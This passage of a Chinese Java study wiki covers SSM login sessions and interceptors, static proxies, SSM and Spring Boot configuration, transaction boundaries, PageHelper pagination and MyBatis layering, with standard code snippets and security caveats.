session.setAttribute(currentUser, user); return redirect:/index.jsp; 处理过程包括： 调用服务层校验身份 登录成功后把当前用户放入 Session 写入 Session 的对象应排除密码等敏感字段。认证成功后还应更新会话标识，防止沿用认证前的会话标识。 Session 登录态传统 SSM 项目里，登录状态通常由 Session 维护。浏览器发起登录请求后，服务器把当前用户信息写进 Session，浏览器再通过 Cookie 携带会话标识访问后续页面。这样一来，服务器就能把“这个请求是谁发的”这件事关联起来。 这套模式的特点很明显： 实现直观，和 JSP 页面配合自然 适合以服务器渲染页面为主的系统 退出登录时只要销毁 Session 即可 Session 可以通过集中式存储支持多实例部署。是否改用不透明 Token 或 JWT 取决于客户端类型、撤销需求和系统边界，JWT 并不是前后端分离项目的默认答案。 Service 层的身份校验一个非常常见的写法是： public User login(String username, String password) User user = userMapper.findByUsername(username); if (user != null user.getPassword().equals(password)) return user; return null; 从工程边界上看，这样分层是合理的： 层级 负责什么 Controller 收参数、返回页面或重定向 Service 校验登录规则 Mapper 查用户数据 上述明文比较仅展示调用位置，不能用于实际系统。Mapper 应按用户名读取密码哈希，Service 使用 Argon2、bcrypt、scrypt 或 PBKDF2 等专用算法验证，密码原文不得进入日志、Session 或响应。 Spring MVC 拦截器public class LoginInterceptor implements HandlerInterceptor @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception HttpSession session = request.getSession(false); User user = (session != null) ? (User) session.getAttribute(currentUser) : null; if (user != null) return true; response.sendRedirect(request.getContextPath() + /user/login); return false; 拦截器适合处理 Spring MVC 控制器访问规则。需要覆盖其他 Servlet、容器级请求或安全响应头时，Filter 的覆盖范围更合适。 放行路径Spring MVC 配置里常见写法如下： mvc:interceptors mvc:interceptor mvc:mapping path=/**/ mvc:exclude-mapping path=/user/login/ mvc:exclude-mapping path=/user/register/ mvc:exclude-mapping path=/static/**/ bean class=com.java.interceptor.LoginInterceptor/ /mvc:interceptor/mvc:interceptors 登录页、注册页、验证码和必要静态资源必须位于明确的公开路径列表中。公开登录端点仍需限速、CSRF 防护和输入校验，排除认证拦截不表示无需安全控制。 传统 SSM 中的 Session 方案登录成功后： session.setAttribute(currentUser, user); 退出登录时： session.invalidate(); 这是一套非常典型的服务器端会话方案。它的优点是直观、简单、容易落地，特别适合 JSP + Spring MVC 这类以服务器端页面为主的项目。 session.invalidate() 销毁服务器端会话状态，使旧会话标识不再代表已登录用户。 资料修改后的 Session 同步资料修改后，如果页面从 Session 读取用户信息，需要刷新会话中的认证主体： @PostMapping(/profile)public String updateProfile(User user, Model model, HttpSession session) userService.updateUser(user); session.setAttribute(currentUser, userService.getUserById(user.getId())); model.addAttribute(msg, 更新成功); return profile; 更新请求不能直接信任客户端提交的 id。应从认证主体取得当前用户 ID，只允许修改授权字段，再从数据库重新读取不含密码的会话对象。 登录请求链用户提交登录表单- Controller 调用 Service 校验- 登录成功写入 Session- 后续请求先经过拦截器- 已登录则放行，未登录则跳回登录页 这条链说明了身份校验、Session 建立、拦截判断和页面跳转之间的运行关系。 认证边界登录流程、Session 方案、拦截器配置、资源排除规则和会话刷新思路，共同组成了传统 SSM 项目的基础访问控制链路。 Session 中“存在用户对象”只证明已认证，不代表有权访问所有资源。角色、资源归属和操作权限仍需在 Controller、Service 或统一授权组件中校验。","tags":[null,null]},{"title":"Java笔记52-Spring静态代理","path":"/wiki/java/java-note-52.html","content":"静态代理不是 Spring 专属概念。它展示了如何在不修改业务类的前提下，通过相同接口包装目标对象并增加行为。 静态代理代理类与目标类实现同一接口，代理内部持有目标对象，并在转发调用前后执行附加逻辑。 静态代理的扩展成本静态代理的结构很直接：目标对象负责业务，代理对象负责在前后插入额外逻辑。它的优点是结构清楚，缺点也同样明显。 优点 缺点 逻辑直观 每个目标类都要单独写代理类 接口关系清楚 业务类一变，代理类往往也要跟着改 适合入门理解 代码数量会随着目标类数量线性膨胀 目标接口或方法数量增加时，静态代理会产生大量重复转发代码。 横切逻辑的位置public void add() log(add); userService.add(); 代理把日志从业务实现中分离，但事务、权限和性能统计还需要明确异常处理、返回值和执行顺序，不能只在方法前简单插入一行代码。 静态代理之所以重要，是因为它先把这个“分离思想”讲明白了。后面的动态代理和 AOP，只是在更高的抽象层上解决同一件事。 代理与业务边界下面的最小示例包含代理对象、目标对象与共同接口。调用方只依赖接口，代理在转发调用前后执行附加逻辑。 public void add() log(add); userService.add(); 代码中的调用关系如下： 代理类内部持有目标对象引用，所以它并不完成业务，而是把核心动作转交给目标对象。 代理类可以在目标方法前后加日志、权限、事务等附加逻辑。 代理与目标必须遵守同一接口契约，包括返回值和异常语义。 从静态代理到 AOP静态代理的优点是直观，缺点是代理类会随着目标类数量一起膨胀。它适合说明“增强逻辑可以和业务逻辑分离”，但不适合支撑大量对象的统一增强。 动态代理在运行时生成转发类，Spring AOP 再通过切点选择需要增强的方法，从而减少静态代理的重复实现。","tags":[null,null]},{"title":"Java笔记55-SSM整合配置总览","path":"/wiki/java/java-note-55.html","content":"传统 SSM 工程通常由 web.xml、根容器配置、Spring MVC 配置和 MyBatis 配置共同组成。 SSM 配置的四个层次SSM 的配置如果只看文件名，很容易觉得只是 web.xml、applicationContext.xml、springmvc.xml、mybatis.xml 四份文件。实际上它们对应的是四个层次的责任： 层次 关注点 Web 入口 请求怎么进入系统 根容器 对象、数据源、事务、Mapper 怎么装配 MVC 容器 Controller、视图、拦截器怎么工作 MyBatis 核心 SQL 映射和结果映射怎么定义 四层配置分别负责容器启动、基础 Bean、Web 组件和 SQL 映射。 三个框架的职责三个框架的职责如下： 组件 负责什么 Spring 管对象、依赖注入、事务 Spring MVC 管请求分发、参数绑定、视图解析、拦截器 MyBatis 管 SQL、结果映射、持久层访问 整合配置把 Controller、Service 和 Mapper 接入同一条请求调用链。 web.xml 启动入口主要的两组配置通常是： listener listener-classorg.springframework.web.context.ContextLoaderListener/listener-class/listenercontext-param param-namecontextConfigLocation/param-name param-valueclasspath:applicationContext.xml/param-value/context-param servlet servlet-namespringmvc/servlet-name servlet-classorg.springframework.web.servlet.DispatcherServlet/servlet-class init-param param-namecontextConfigLocation/param-name param-valueclasspath:springmvc.xml/param-value /init-param/servletservlet-mapping servlet-namespringmvc/servlet-name url-pattern//url-pattern/servlet-mapping ContextLoaderListener 创建根容器，DispatcherServlet 创建 MVC 子容器并接收 Web 请求。 根容器与 MVC 容器 容器 典型内容 Spring 根容器 dataSource、SqlSessionFactoryBean、Service、事务 Spring MVC 容器 Controller、视图解析器、静态资源、拦截器 MVC 子容器可以访问根容器中的 Service 等 Bean；根容器不能反向依赖只存在于子容器中的 Controller。 applicationContext.xml根容器按以下依赖顺序创建数据访问组件： context:property-placeholder location=classpath:db.properties/bean id=dataSource class=com.mchange.v2.c3p0.ComboPooledDataSource property name=driverClass value=$jdbc.driver/ property name=jdbcUrl value=$jdbc.url/ property name=user value=$jdbc.username/ property name=password value=$jdbc.password//beanbean id=sqlSessionFactory class=org.mybatis.spring.SqlSessionFactoryBean property name=configLocation value=classpath:mybatis.xml/ property name=mapperLocations value=classpath:mapper/*.xml/ property name=dataSource ref=dataSource//bean 初始化顺序如下： 先读取独立配置文件 再创建数据源 再把数据源交给 MyBatis 最后让 Mapper 接入 Spring Mapper 扫描bean class=org.mybatis.spring.mapper.MapperScannerConfigurer property name=basePackage value=com.java.mapper/ property name=sqlSessionFactoryBeanName value=sqlSessionFactory//bean MapperScannerConfigurer 为 Mapper 接口创建代理并注册到 Spring，Service 因而可以像注入普通 Bean 一样注入 Mapper。 事务配置事务管理器与事务通知应使用同一个数据源： bean id=transactionManager class=org.springframework.jdbc.datasource.DataSourceTransactionManager property name=dataSource ref=dataSource//beantx:advice id=txAdvice transaction-manager=transactionManager tx:attributes tx:method name=select* propagation=SUPPORTS read-only=true/ tx:method name=find* propagation=SUPPORTS read-only=true/ tx:method name=update* propagation=REQUIRED/ tx:method name=delete* propagation=REQUIRED/ /tx:attributes/tx:advice 匹配切点的 Service Bean 会被代理，只有经过代理的方法调用才进入事务规则。类内部自调用可能绕过事务代理。 容器扫描边界applicationContext.xml 和 springmvc.xml 分别负责不同层。如果两边都扫描过大范围包名，就可能出现控制器、服务类被重复装配，或者某些 Bean 被放进不该去的容器里。更稳妥的做法通常是： 根容器只管 Service、Mapper、数据源、事务 MVC 容器只管 Controller、拦截器、视图解析和静态资源 明确扫描边界可以避免 Bean 重复创建和事务代理失效。 springmvc.xml常见骨架通常像这样： context:component-scan base-package=com.java.controller/mvc:annotation-driven/mvc:resources mapping=/static/** location=/static// bean class=org.springframework.web.servlet.view.InternalResourceViewResolver property name=prefix value=// property name=suffix value=.jsp//bean 这一部分回答的是： Controller 从哪里扫 注解能力是否开启 JSP 怎么解析 静态资源是否能正常访问 配置关系可以把 SSM 的配置理解成下面这张图： 层次 入口 配置 最终作用 Web 入口 web.xml 拉起容器、接入请求 根容器 applicationContext.xml 管对象、数据源、事务、Mapper MVC 容器 springmvc.xml 管 Controller、视图、拦截器 持久层核心 mybatis.xml 管映射规则、日志、别名 这张结构图标明了登录、列表、分页和事务代码所在的层次，也能用于排查组件扫描、Bean 可见性和事务代理范围。","tags":[null,null]},{"title":"Java笔记57-SSM品牌模块","path":"/wiki/java/java-note-57.html","content":"品牌列表同时涉及请求映射、Service 调用、Mapper 查询和页面渲染，也可以为局部修改提供 JSON 接口。 列表模块的三层结构一个典型的页面型控制器方法可能像这样： @GetMapping(/list)public String list(Model model) ListBrand list = brandService.selectAll(); model.addAttribute(list, list); return brand_list; 各层职责如下： 层级 负责什么 Controller 接收请求、放数据、决定返回哪个页面 Service 承接业务调用 Mapper 执行查询 JSP 视图层 展示最终数据 Controller 只准备模型和视图，查询实现留在 Mapper。 查询条件、分页与视图状态真实的后台列表通常不会永远只查全部数据。随着功能继续扩展，列表页会自然带出几个能力： 按名称、状态等字段筛选 按页码和页大小分页 按创建时间、排序字段展示 勾选多条数据后批量操作 这些页面交互最终都会形成后端查询条件。Controller 接收条件，Service 组织查询规则，Mapper 将条件转为 SQL；分层可以避免筛选、分页和排序逻辑全部堆入控制器。 页面渲染与接口返回很多 SSM 项目并不是纯页面渲染，也不是纯接口项目，而是两种风格并存。 例如页面渲染： @GetMapping(/list)public String list(Model model) model.addAttribute(list, brandService.selectAll()); return brand_list; 例如 AJAX 修改： @PostMapping(/edit)@ResponseBodypublic MapString, Object edit(Brand brand) int count = brandService.update(brand); return Collections.singletonMap(updated, count); 页面渲染和 JSON 接口可以并存，但应采用一致的错误状态、校验规则和权限检查。 Model 与视图数据Model 把控制层准备的数据交给视图层： model.addAttribute(list, list);return entity_list; 它完成的是从控制层到页面层的数据传递。控制器不需要自己拼 HTML，也不需要直接输出内容，而是把数据交给视图模板。 CRUD 接口列表一旦存在，后续最自然的需求通常就是： 新增 修改 删除 批量删除 这时控制层就很容易出现两种不同返回风格： 场景 更常见的返回方式 整页加载 返回 JSP 视图名 弹窗编辑、局部刷新、批量操作 返回 JSON JSON 接口应返回稳定的响应结构和 HTTP 状态，不应把数据库影响行数直接当成完整的外部接口契约。 页面返回与 JSON 返回页面型返回适合首次进入列表、需要服务器渲染完整 JSP 的场景；接口型返回适合局部刷新、弹窗编辑、批量删除这类交互。两者并存并不矛盾，关键是控制层方法的职责要清楚。 如果方法返回视图名，就让它专注准备页面模型；如果方法返回 JSON，就让它专注表达操作结果。这样前端页面和后端接口都更容易维护。 批量删除的参数绑定一个常见例子是： @PostMapping(/batchDelete)@ResponseBodypublic MapString, Object batchDelete(@RequestParam(ids) ListInteger ids) int count = brandService.batchDelete(ids); return Collections.singletonMap(deleted, count); 该方法涉及两项边界： Spring MVC 如何绑定集合参数 Controller 怎样把结果包装成前端更好消费的结构 批量删除还需要注意事务边界。如果删除动作背后不仅删除主表记录，还会删除关联表数据，就应该由 Service 层把整个操作纳入同一个事务中，而不是让页面一次触发多个分散的数据库操作。 常见结构问题 常见问题 更稳的做法 Controller 里直接写 SQL 查询留在 Mapper 页面逻辑和业务逻辑混在一起 页面留给 JSP，业务留给 Service 所有操作都整页跳转 局部交互可以逐步改为 JSON 只查全部，不限制返回数量 增加固定排序、分页和页大小上限 模块边界 列表如何渲染 数据如何跨层传递 页面型请求和接口型请求如何并存 基础 CRUD 如何逐步扩展 列表接口通常还需要固定排序、限制页大小、校验批量删除 ID，并区分页面跳转失败与接口错误。这样 Controller、Service 和 Mapper 的边界才能在数据量增大或返回方式变化时保持稳定。","tags":[null,null]},{"title":"Java笔记58-SSM事务边界与状态更新","path":"/wiki/java/java-note-58.html","content":"事务边界通常位于 Service 层，用于保证一个业务动作中的多次数据库写入共同提交或回滚。状态流转还需要业务规则和并发控制，不能只依赖事务原子性。 Service 层的事务边界单表写入可以声明事务： @Transactionalpublic int submit(Integer userId, Integer targetId) BizRecord record = new BizRecord(); record.setUserId(userId); record.setTargetId(targetId); record.setStatus(PENDING); return bizMapper.insert(record); 当方法只执行一次插入时，事务范围较小；它仍为后续增加明细、库存或日志写入提供统一边界。 完整业务动作订单类模块里，一个“提交”动作往往不是只插入一条记录。更完整的业务可能会同时涉及： 写订单主表 写订单明细表 修改库存或资源状态 写操作日志 更新用户相关统计 这些动作单独看都是 SQL，但放在业务里必须作为一个整体成立。只成功一半比全部失败更危险，因为它会造成数据状态不一致。Service 层之所以适合作为事务边界，正是因为它能表达“一次完整业务动作”的范围。 @Transactional 的覆盖范围事务应覆盖完整业务动作，而不是只包住其中一条 Mapper 调用。 层级 是否适合作为事务边界 Controller 不适合，太靠近请求入口 Service 最适合，承接完整业务动作 Mapper 太细，只负责单次数据访问 事务还要注意回滚规则。Spring 默认通常对运行时异常触发回滚，而受检异常是否回滚需要根据配置决定。如果业务中通过返回值表达失败，但没有抛出异常，事务可能并不会自动回滚。因此事务方法里不仅要关注 @Transactional 是否存在，还要关注异常如何传播。 状态更新除了新建记录，状态流转也经常需要事务保护： @Transactionalpublic int updateStatus(Integer id, String status) return bizMapper.updateStatus(id, status); 更新语句应同时约束记录 ID 和允许的前置状态，例如只允许 PENDING - PAID。根据影响行数可以识别记录不存在或状态已被其他请求改变。 状态更新还应该考虑合法流转。比如一条记录从 PENDING 到 PAID，和从 CANCELLED 再变回 PAID，业务含义完全不同。事务能保证数据库操作的原子性，但不能自动保证状态流转合理；这部分仍然需要 Service 层写清业务规则。 多表查询一旦进入“订单”“记录”“业务单据”这一类场景，展示层就很少只看一张表。实际页面经常需要同时看到： 当前记录本身 关联用户信息 关联资源信息 当前状态说明 多表查询不自动要求写事务，但需要根据一致性要求选择隔离级别或读模型。 事务模块与列表模块 模块类型 更关注什么 普通列表模块 展示、查询、分页 事务类模块 状态变化、一致性、业务边界 写操作由 Service 统一组织，Mapper 只表达具体 SQL。 分页与事务真实系统里，事务类模块往往既有提交动作，也有列表查询和历史记录展示。所以它很容易继续扩展到： 当前用户记录列表 管理端总览列表 分页加载 条件筛选 查询和写入可以使用不同事务属性；只读事务是对事务管理器和数据库的提示，不是阻止写入的安全机制。 读写事务策略在事务配置里，经常会看到查询方法设置 readOnly=true，而新增、修改、删除使用默认可写事务。这样做的意义是把不同类型操作的意图表达清楚： 方法类型 常见事务策略 查询 只读，强调不修改数据 新增 修改 删除 可写，失败时需要回滚 状态流转 可写，并需要严格校验前置状态 方法命名规则只能作为约定。注解或切点必须实际匹配代理方法，且调用需要经过代理对象。 事务失效与并发边界Spring 默认通常只对未捕获的运行时异常回滚；受检异常、异常被捕获后吞掉、类内部自调用和对象未进入 Spring 容器，都可能让预期回滚失效。并发状态更新还应使用条件更新、乐观锁或显式锁处理竞争，事务本身不会自动阻止业务上的重复提交。","tags":[null,null]},{"title":"Java笔记60-SpringBoot启动类与自动配置","path":"/wiki/java/java-note-60.html","content":"版本边界： 示例未给出完整依赖版本。Spring Boot 3 要求 Java 17 或更高版本并使用 Jakarta EE API；代码能否直接运行应以项目 pom.xml 和对应版本官方文档为准。 Spring Boot 启动类通常只有几行，但会触发环境加载、应用上下文创建、组件扫描、自动配置和 Web 服务器启动等过程。 Spring Boot 启动入口启动类的常见结构如下： @SpringBootApplication@MapperScan(com.java.springboot.mapper)public class Application public static void main(String[] args) SpringApplication.run(Application.class, args); 启动入口包含四项职责： 代码位置 作用 main 方法 提供 Java 程序标准入口 SpringApplication.run(...) 创建 Spring 容器，刷新上下文，启动内嵌服务器 @SpringBootApplication 开启自动配置、配置类能力和组件扫描 @MapperScan 把 MyBatis 的 Mapper 接口交给 Spring 管理 传统外部容器部署中的 web.xml、监听器和 DispatcherServlet 注册，可以由 Spring Boot 的自动配置与嵌入式容器启动过程接管。 SpringApplication.run()SpringApplication.run(Application.class, args) 会准备环境、创建应用上下文、注册 Bean 定义并刷新容器。Servlet Web 应用在相关依赖和配置成立时启动嵌入式 Web 服务器；具体实现不一定是 Tomcat。 可以把它理解成下面这条线： main 方法- SpringApplication.run(...)- 加载配置与环境- 创建并刷新 Spring 容器- 扫描组件并装配 Bean- 启动内嵌 Web 容器- 接收 HTTP 请求 Spring Boot 既可以构建带嵌入式服务器的可执行包，也可以按兼容条件部署为外部容器使用的 WAR。 @SpringBootApplication@SpringBootApplication 是组合注解，包含以下能力： 组成能力 作用 @Configuration 表示当前类可以作为配置类 @EnableAutoConfiguration 根据依赖和配置项尝试自动装配 @ComponentScan 扫描当前包及其子包中的组件 默认组件扫描从启动类所在包向下进行，因此启动类通常位于应用根包。Mapper 是否由组件扫描发现取决于 MyBatis 的注解和扫描配置，不能只依赖 @SpringBootApplication。 自动配置条件自动配置按条件注册 Bean： 先根据依赖判断某个功能有没有出现 再根据配置项判断是否满足启用条件 满足条件后，注册一组默认 Bean 比如： 导入了 spring-boot-starter-web，框架就会准备 Web 环境 导入了 mybatis-spring-boot-starter，再配好数据源，MyBatis 相关能力就能接上 配了 server.port，Tomcat 监听端口就会发生变化 依赖决定哪些类型可用，配置属性和现有 Bean 决定具体自动配置是否生效。 自动配置还有一个重要特点：它通常会尊重已有 Bean。如果项目中已经手动声明了某个同类型 Bean，自动配置往往不会再创建默认对象。这样既能提供开箱即用的默认行为，又给自定义扩展留下空间。 Starter 依赖pom.xml 里最有代表性的部分通常是这些： dependency groupIdorg.springframework.boot/groupId artifactIdspring-boot-starter-web/artifactId/dependencydependency groupIdorg.mybatis.spring.boot/groupId artifactIdmybatis-spring-boot-starter/artifactId version3.0.3/version/dependency Starter 提供两项能力： 帮忙整理一组常用依赖，减少手工拼装成本 给自动配置提供“判断条件” Starter 只整理依赖集合；是否创建 Bean 仍由自动配置条件决定。 Mapper 扫描MyBatis Mapper 可以通过包扫描注册： @MapperScan(com.java.springboot.mapper) 它解决的是 Mapper 接口如何进入 Spring 容器的问题。Mapper 接口没有具体实现类，Spring 本身不能直接实例化它们；@MapperScan 会帮助扫描这些接口，并通过代理方式把它们注册成可注入对象。 如果缺了这一层，下面这种注入就接不上： @Servicepublic class BrandServiceImp implements BrandService @Autowired private BrandMapper brandMapper; 启动类的包位置启动类最常见的问题通常有这几种： 现象 常见原因 Controller 没扫描到 启动类包位置过低，扫描范围不对 Mapper 无法注入 忘记 @MapperScan，或包名写错 自动配置不生效 依赖不完整，或手工配置冲掉默认行为 应用启动报端口冲突 server.port 与本机占用端口冲突 排查启动问题时可以查看条件评估报告，确认自动配置未生效是缺少类、属性条件不满足，还是已有 Bean 使默认配置退让。","tags":[null,null]},{"title":"Java笔记61-SpringBoot配置文件与多环境思路","path":"/wiki/java/java-note-61.html","content":"Spring Boot 将端口、数据源、日志、上传限制和应用自定义参数纳入统一的外部配置体系。配置需要按职责、环境和敏感级别分层。 应用配置入口常见的 Spring Boot 配置通常会集中在这里： spring.application.name=SpringBootserver.port=8081spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driverspring.datasource.url=jdbc:mysql://db-host:db-port/db-name?useSSL=falsecharacterEncoding=utf8spring.datasource.username=$DB_USERNAMEspring.datasource.password=$DB_PASSWORDmybatis.type-aliases-package=com.java.springboot.pojomybatis.mapper-locations=classpath:mapper/*Mapper.xmlmybatis.configuration.map-underscore-to-camel-case=truemybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl 配置项可以按功能分组： 配置分组 说明 spring.application.* 应用基础标识 server.* Web 端口、上下文等服务器参数 spring.datasource.* 数据库连接信息 mybatis.* MyBatis 的映射、别名、日志、驼峰转换 配置集中并不等于全部写入同一文件；公共默认值、环境差异和密钥应使用不同来源。 运行环境参数端口、数据库地址、日志级别、上传目录这些内容都有一个共同点：它们不是业务逻辑本身，而是应用在某个环境里运行时需要的外部条件。把它们写进配置文件，能让同一套代码在不同机器、不同数据库、不同端口下运行。 环境差异适合外部化，复杂业务规则仍应保留在可测试的代码中。配置开关也要有明确的默认值、所有者和失效策略。 敏感配置数据库连接和第三方服务凭据不应以真实值写入示例或代码仓库。以下信息应使用占位符、环境变量或 Secret： 数据库地址和库名 用户名与密码 第三方服务密钥 更稳妥的配置通常像这样： spring.datasource.url=$DB_URLspring.datasource.username=$DB_USERNAMEspring.datasource.password=$DB_PASSWORD 或者： spring.datasource.url=jdbc:mysql://db-host:db-port/db-namespring.datasource.username=db-usernamespring.datasource.password=db-password 环境变量只避免把密钥写入仓库，不代表进程环境本身是密钥保险库；生产环境可以使用部署平台的 Secret 或专门的密钥管理服务。 Properties 与 YAML两者都能完成 Spring Boot 配置，但写法风格不同。 格式 特点 .properties 直白、兼容性好、单行配置清晰 .yml .yaml 层级表达更自然，复杂配置更好读 例如同一段数据源配置如果写成 YAML，通常会是： spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://db-host:db-port/db-name username: $DB_USERNAME password: $DB_PASSWORD YAML 对缩进敏感，缩进错误会改变属性层级；同一位置不应同时维护含义冲突的 properties 与 YAML 配置。 多环境配置即使是个人练手项目，也经常会遇到下面这些情况： 本地开发库和线上库不一样 开发端口与部署端口不一样 日志等级在不同环境下应该不同 可以按 Profile 拆分配置： spring.profiles.active=dev 再配合： application-dev.properties application-test.properties application-prod.properties 激活生产 Profile 更适合由命令行、环境变量或部署平台提供，避免把 spring.profiles.active 固定提交为某个环境。 配置来源优先级Spring Boot 可以从多个位置读取配置，例如项目内配置文件、命令行参数、系统环境变量等。越靠近运行环境的配置，越适合承载差异化信息。 比如数据库密码、JWT 密钥、上传目录这类内容，放在环境变量或部署平台的配置中心里会更稳妥；而 MyBatis 驼峰映射、应用名、默认分页大小这类通用项，则可以保留在项目配置文件中。 $DB_USERNAME、$DB_PASSWORD 把值留给外部来源。是否允许缺省值以及缺失时是否阻止启动，应由配置契约明确。 配置边界一个配置文件如果没有边界意识，常见问题会很快出现： 问题 表现 安全配置与普通配置混在一起 密钥容易泄露 本地路径写死 换机器就失效 环境差异不分离 开发、测试、生产互相污染 业务开关散落 排查行为变化非常困难 应用启动时可以使用类型安全的 @ConfigurationProperties 绑定自定义配置，并配合校验尽早发现缺失或非法值。","tags":[null,null]},{"title":"Java笔记59-IntelliJIDEA常用操作","path":"/wiki/java/java-note-59.html","content":"以下快捷键基于 IntelliJ IDEA 的 Windows 默认键位。自定义 Keymap、插件和不同版本可能改变实际绑定，可在 Settings | Keymap 中查询当前配置。 代码补全与生成常用补全与生成操作如下： 操作 作用 main psvm 快速生成 main 方法 sout 快速生成 System.out.println() fori 生成普通 for 循环 iter 生成增强 for 循环 Alt + Enter 导包、修复提示、快速处理警告 main、psvm、sout 等属于 Live Templates，模板名称可在设置中查看和修改。 编辑操作 快捷键 作用 Ctrl + D 复制当前行 Ctrl + / 单行注释 Ctrl + Alt + L 格式化代码 Alt + Insert 快速生成构造器、getter/setter、toString() Shift + F6 重命名变量、方法、类 其中两项涉及代码结构： Alt + Insert：写实体类、普通 JavaBean 时非常高频。 Shift + F6：执行基于符号引用的重命名，比文本替换更能保持引用一致。 查找、跳转与方法签名 快捷键 作用 Ctrl + B 跳到定义 Ctrl + P 查看方法参数提示 Shift + Shift 全局搜索类、文件、符号、动作 Ctrl + E 最近打开的文件 阅读源码时可以组合使用： 先用 Ctrl + B 跳实现 再用 Ctrl + P 看参数 找不到文件时直接 Shift + Shift Ctrl + B 的目标取决于光标位置；查看接口实现还可以使用 IDE 的实现跳转动作，并以当前 Keymap 显示的快捷键为准。 运行与调试 快捷键 作用 Shift + F10 运行当前程序 Shift + F9 调试当前程序 Ctrl + F8 添加 取消断点 F8 单步跳过 F7 单步进入 多线程调试会改变线程调度时序，不能把调试器中观察到的顺序直接当作正常运行时的固定行为。 常用工作方式 对红线和警告使用 Alt + Enter 查看 IDE 提供的修复项，并确认修改语义。 需要补构造器、getter/setter、toString() 时优先 Alt + Insert。 重命名不要手改，直接用 Shift + F6。 想看源码定义、接口实现、方法参数时，优先 Ctrl + B 和 Ctrl + P。 根据问题选择断点、日志或测试；调试器不适合验证时序敏感的性能结论。 使用边界生成代码、自动修复和重构都应在版本控制下执行并审查差异。IDE 能识别大量语法与引用关系，但不能替代测试和技术判断。","tags":[null,null]},{"title":"Java笔记64-SpringBoot分页、多条件搜索与PageHelper","path":"/wiki/java/java-note-64.html","content":"分页查询需要统一处理页码、页大小、固定排序、筛选条件、总记录数和响应结构。 offset 与 limit手写分页的典型结构如下： public ListBook findPage(int page, int size) int offset = (page - 1) * size; return bookMapper.findPage(offset, size); 对应 SQL： select id=findPage resultType=com.java.pojo.Book SELECT * FROM book ORDER BY id LIMIT #offset, #limit/select 偏移量公式为： offset = (page - 1) * size page 通常从 1 开始，而数据库偏移量从 0 开始。如果页码没有做最小值保护，page = 0 会导致偏移量变成负数。分页参数进入 Service 层后，应先设置默认值、最大页大小和边界校验，再交给 Mapper。 手写分页的维护成本手工分页一开始没有问题，但往后经常会碰到这些事： 还要再查一次总记录数 条件搜索也要带分页 每张表都要重复写 offset + limit 返回结构要兼顾列表和总数 因此手写分页通常还要配套总数 SQL 和统一分页对象。 PageResultT分页接口通常不只要返回一组数据，还要告诉前端总数、状态和消息。 public class PageResultT private Integer code = 0; private String msg = ; private Integer count; private ListT data; 字段 作用 code 请求是否成功 msg 文本说明 count 总记录数 data 当前页数据 多条件搜索真实后台很少只有“纯分页”，更常见的是按名称、作者、状态做筛选。这时 SQL 往往会进入动态条件写法： select id=searchPage resultType=com.java.pojo.Book SELECT * FROM book where if test=title != null and title != title LIKE CONCAT(%, #title, %) /if if test=author != null and author != AND author LIKE CONCAT(%, #author, %) /if /where ORDER BY id LIMIT #offset, #limit/select where 在存在条件时生成 WHERE，并移除开头多余的 AND 或 OR。筛选值继续使用 # 绑定；可选排序字段必须通过白名单映射。 PageHelperPageHelper 通过 MyBatis 拦截器改写紧随其后的查询，并可附加总数查询： PageHelper.startPage(page, size);ListBook list = bookMapper.search(title, author);PageInfoBook pi = new PageInfo(list);return new PageResult((int) pi.getTotal(), pi.getList()); 方案 特点 手写 offset + limit 控制力强，逻辑透明 PageHelper 少写分页 SQL，总数统计更自然 startPage(page, size) 把分页参数绑定到当前线程上下文，应紧邻目标 Mapper 查询并避免中间执行其他 SQL。查询异常或控制流提前返回时应按所用版本的 API 确认上下文清理行为，防止分页参数影响线程复用后的其他查询。 分页边界页码必须大于等于 1，页大小应设置上限，总数可能超过 Integer 范围，因此不应无条件把 PageInfo.getTotal() 强转为 int。偏移量较大的查询可能退化为大量扫描，可根据交互需求改用基于唯一排序键的游标分页。","tags":[null,null]},{"title":"Java笔记62-SpringBoot整合MyBatis与分层调用","path":"/wiki/java/java-note-62.html","content":"Spring Boot 整合 MyBatis 后，请求仍按 Controller、Service、Mapper 和数据库的顺序执行；自动配置主要减少数据源、会话工厂和 Mapper 注册的装配代码。 最小查询链路控制器： @Controller@RequestMapping(/brand)public class BrandController @Autowired private BrandService brandService; @RequestMapping(/selectAll) @ResponseBody public ListBrand selectAll() return brandService.selectAll(); 服务层： @Servicepublic class BrandServiceImp implements BrandService @Autowired private BrandMapper brandMapper; @Override public ListBrand selectAll() return brandMapper.selectAll(); Mapper 接口： public interface BrandMapper ListBrand selectAll(); Mapper XML： mapper namespace=com.java.springboot.mapper.BrandMapper select id=selectAll resultType=Brand SELECT * FROM tb_brand /select/mapper 四层代码的职责如下： 层级 负责的事情 Controller 接请求、返回结果 Service 组织业务调用 Mapper 接口 定义持久层方法 Mapper XML 写 SQL 和结果映射 Mapper 代理对象BrandMapper 是接口，本身没有实现类。服务层能直接注入它，是因为 MyBatis 在运行时根据 Mapper 接口和 XML 映射关系生成了代理对象。这个代理对象接到方法调用后，会根据接口方法名找到对应 SQL，再通过 SqlSession 执行数据库操作。 brandMapper.selectAll()- Mapper 代理对象- namespace + id 定位 SQL- SqlSession 执行- ResultSet 映射为 Brand 对象 Mapper 接口代理要求 XML 的 namespace 对应接口全限定名，语句 id 对应接口方法名；参数和返回类型也必须与方法签名兼容。 Mapper 接口与 XML 映射启动类里的： @MapperScan(com.java.springboot.mapper) 该注解扫描 Mapper 接口并注册运行时代理，Service 注入的 BrandMapper 不是手写实现类。 然后配置文件里的： mybatis.mapper-locations=classpath:mapper/*Mapper.xmlmybatis.type-aliases-package=com.java.springboot.pojo 继续完成两件事： 把 XML 映射文件找到 让 Brand 这种结果类型可以直接写短名 Mapper XML 路径必须与构建产物中的类路径位置一致；打包后可在 target/classes 中核对资源是否存在。 Service 层职责在最短查询案例里，Service 方法看起来只是调用 Mapper，好像可以省略。但随着业务变复杂，Service 层会承担更多职责： 组合多个 Mapper 调用 处理业务校验 控制事务边界 统一返回业务含义明确的结果 简单查询中的 Service 可能很薄。是否保留这一层取决于系统边界；存在业务校验、事务或多个持久层调用时，Controller 直接调用 Mapper 会把 Web 层与持久层耦合。 请求链浏览器请求- Controller- Service- Mapper 代理- Mapper XML 中的 SQL- 数据库- 返回 Java 对象- JSON 响应 写操作还必须明确事务边界，查询应避免无条件 SELECT * 